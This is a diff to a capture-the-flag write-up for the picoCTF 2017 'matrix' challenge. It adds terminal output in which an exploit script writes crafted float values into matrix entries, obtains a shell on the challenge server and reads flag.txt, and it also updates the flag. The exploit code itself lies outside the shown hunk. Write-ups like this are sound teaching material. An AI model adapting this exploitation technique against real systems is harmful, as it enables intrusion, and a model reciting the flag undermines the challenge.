@@ -81,7 +81,19 @@ r.interactive()
 
 If you have problems with floats remember to use  `%.9g`  format, it should allow to represent it unambiguously (when I used  `%f`,  `%g`  or  `%e`  it was encoded differently on server).
 
-The flag is  `56d46f10a5d2030c6c4a8ad4294c11fd`.
+```text
+$ python matrix.py 
+[+] Opening connection to shell2017.picoctf.com on port 52501: Done
+[*] Switching to interactive mode
+Enter command: Successfully set matrix[0][2] = -4.36863098e+33
+Enter command: Successfully set matrix[0][0] = 1.8057176e+28
+Enter command: Successfully set matrix[0][1] = 9.59221169e-39
+Enter command: $ cat flag.txt
+5d19abbdda3886fc91c195c8a3b0d8a1
+```
+
+The flag is  `5d19abbdda3886fc91c195c8a3b0d8a1`.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIzMTQxNjQ2OSwtMTE5OTA3MTU1MV19
+eyJoaXN0b3J5IjpbLTE3MzgzMDQxMzQsLTExOTkwNzE1NTFdfQ
+==
 -->
